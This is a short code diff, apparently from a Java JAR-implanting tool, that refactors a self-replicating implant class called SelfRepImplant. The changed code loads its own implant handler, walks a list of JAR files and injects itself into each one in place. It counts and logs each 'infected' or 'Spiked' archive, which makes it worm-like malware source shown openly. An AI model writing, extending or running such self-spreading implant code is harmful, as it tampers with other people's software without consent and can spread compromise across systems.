@@ -1,8 +1,6 @@
 package org.example.implants;
 
-import org.example.injector.ClassInjector;
-import org.example.injector.ImplantHandler;
-import org.example.injector.ImplantHandlerImpl;
+import io.github.w1th4d.jarplant.*;
 
 import java.io.IOException;
 import java.net.InetAddress;
@@ -98,7 +96,7 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
         ImplantHandler implantHandler;
         try {
             implantHandler = ImplantHandlerImpl.findAndCreateFor(SelfRepImplant.class);
-        } catch (ClassNotFoundException | IOException e) {
+        } catch (ClassNotFoundException | ImplantException | IOException e) {
             System.out.println("[!] Cannot load oneself. Aborting.");
             System.exit(1);
             throw new RuntimeException("Unreachable");
@@ -109,10 +107,18 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
         int numInfected = 0;
         for (Path jarToImplant : jarsToImplant) {
             // Potential optimization: Multi-thread this.
-            ClassInjector injector = new ClassInjector(implantHandler);
+            ClassInjector injector;
+            try {
+                injector = ClassInjector.createLoadedWith(implantHandler);
+            } catch (ImplantException e) {
+                // Future optimization: Have the ImplantHandler check whatever throws this exception.
+                throw new RuntimeException(e);
+            }
 
             try {
-                injector.infect(jarToImplant, jarToImplant);
+                JarFiddler jar = JarFiddler.buffer(jarToImplant);
+                injector.injectInto(jar);
+                jar.write(jarToImplant);
                 numInfected++;
                 System.out.println("[+] Spiked JAR '" + jarToImplant + "'.");
             } catch (IOException e) {
